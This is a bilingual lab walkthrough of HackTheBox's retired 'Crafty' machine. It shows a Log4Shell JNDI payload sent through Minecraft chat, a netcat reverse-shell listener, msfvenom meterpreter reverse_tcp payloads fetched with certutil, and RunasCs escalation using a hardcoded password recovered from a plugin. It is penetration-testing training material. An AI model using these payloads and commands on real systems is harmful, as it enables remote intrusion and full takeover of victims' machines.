# Crafty [Easy]

> **ES:** Máquina Windows fácil: un servidor Minecraft 1.16.5 vulnerable a Log4Shell da acceso, y una contraseña en un plugin lleva a Administrator.
> **EN:** Easy Windows machine: a Minecraft 1.16.5 server vulnerable to Log4Shell gives access, and a password inside a plugin leads to Administrator.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Windows |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Crafty] |
| **URL** | https://app.hackthebox.com/machines/Crafty |
| **IP lab** | 10.10.11.249 |
| **Fecha de resolución** | 2024-03-27 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía Log4Shell (CVE-2021-44228) en el chat de Minecraft → password en plugin → RunasCs a Administrator.
> **EN:** Get `user.txt` and `root.txt` via Log4Shell (CVE-2021-44228) in the Minecraft chat → password in plugin → RunasCs to Administrator.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] pyCraft (cliente Minecraft)
- [ ] log4j-shell-poc (LDAP + web server)
- [ ] msfvenom / metasploit (meterpreter)
- [ ] jadx (reversing del plugin)
- [ ] RunasCs

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** IIS en 80 (redirige a `crafty.htb`) y Minecraft 1.16.5 en 25565. La versión del juego delata Log4j vulnerable.
> **EN:** IIS on 80 (redirects to `crafty.htb`) and Minecraft 1.16.5 on 25565. The game version hints at vulnerable Log4j.

```bash
nmap -A --min-rate=5000 -T5 -p- 10.10.11.249
echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
```

**Resultado / Result:** 80/tcp IIS 10.0, 25565/tcp Minecraft 1.16.5 (Protocol 127). Windows Server 2019.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El servidor acepta conexiones offline (pyCraft). El chat del juego registra con Log4j, candidato a CVE-2021-44228.
> **EN:** The server accepts offline connections (pyCraft). The game chat logs with Log4j, a CVE-2021-44228 candidate.

```bash
python3 start.py
# usuario cualquiera, modo offline, host 10.10.11.249
```

**Resultado / Result:** Conexión al servidor de juego confirmada como punto de inyección.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Se levanta LDAP+HTTP del PoC y se envía `${jndi:ldap://<TU-IP>:1389/a}` por el chat; el servidor carga la clase y devuelve PowerShell como `svc_minecraft`.
> **EN:** Start the PoC LDAP+HTTP servers and send `${jndi:ldap://<YOUR-IP>:1389/a}` via chat; the server loads the class and returns PowerShell as `svc_minecraft`.

```bash
python3 poc.py --userip <TU-IP> --webport 80 --lport 9999
rlwrap nc -lvnp 9999
# en el cliente Minecraft enviar: ${jndi:ldap://<TU-IP>:1389/a}
whoami
```

**Resultado / Result:** Shell PowerShell como `crafty\svc_minecraft`. Se estabiliza subiendo un meterpreter (`msfvenom` + `certutil -urlcache -f`).

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** El escritorio de `svc_minecraft` contiene `user.txt`.
> **EN:** `svc_minecraft`'s desktop contains `user.txt`.

```bash
type C:\users\svc_minecraft\Desktop\user.txt
```

**Resultado / Result:** `user.txt` leído (flag no reproducida).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** En `C:\users\svc_minecraft\server\plugins` hay un plugin propio; al descompilarlo con jadx aparece la contraseña de Administrator, usada con RunasCs para lanzar un segundo meterpreter elevado.
> **EN:** In `C:\users\svc_minecraft\server\plugins` there is a custom plugin; decompiling it with jadx reveals the Administrator password, used with RunasCs to launch a second elevated meterpreter.

```bash
# meterpreter sesion 1
ls C:\users\svc_minecraft\server\plugins
download playercounter-1.0-SNAPSHOT.jar
# local: jadx playercounter-1.0-SNAPSHOT.jar  -> buscar hardcoded password
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU-IP> LPORT=7777 -f exe -o exp-7777.exe
# subir exp-7777.exe y RunasCs.exe, listener en 7777
.\RunasCs.exe administrator <password-del-plugin> exp-7777.exe
getuid
cat C:\users\administrator\desktop\root.txt
```

**Resultado / Result:** Sesión como `CRAFTY\Administrator` → `root.txt` (flag no reproducida). Técnica: secreto hardcodeado + RunAs.

---

## 🧠 Lo aprendido / Learned

> **ES:** Servicios no-HTTP (Minecraft) también son superficie Log4Shell; estabilizar con meterpreter ayuda a exfiltrar; los plugins custom esconden secretos; RunasCs permite reutilizar credenciales sin RDP.
> **EN:** Non-HTTP services (Minecraft) are Log4Shell surface too; stabilizing with meterpreter helps exfiltration; custom plugins hide secrets; RunasCs reuses credentials without RDP.

- [ ] Log4Shell (CVE-2021-44228) vía chat de Minecraft
- [ ] Estabilización con meterpreter vía `certutil`
- [ ] Reversing de plugin Java (jadx) y secreto hardcodeado
- [ ] Escalado con RunasCs a Administrator

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `Soluciones/Machines/unclasified/Crafty/index.md` (notas CN/EN sin normalizar, con capturas en `img/`) — autor original de la nota local
- **Walkthrough de referencia:** Máquina Crafty en HackTheBox — https://app.hackthebox.com/machines/Crafty
- **Referencia técnica:** CVE-2021-44228 (Log4Shell) — https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Contenido migrado y normalizado desde `index.md` al molde `_PLANIFICACION/PLANTILLA_MACHINE.md`; paráfrasis propia, sin flags completas.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
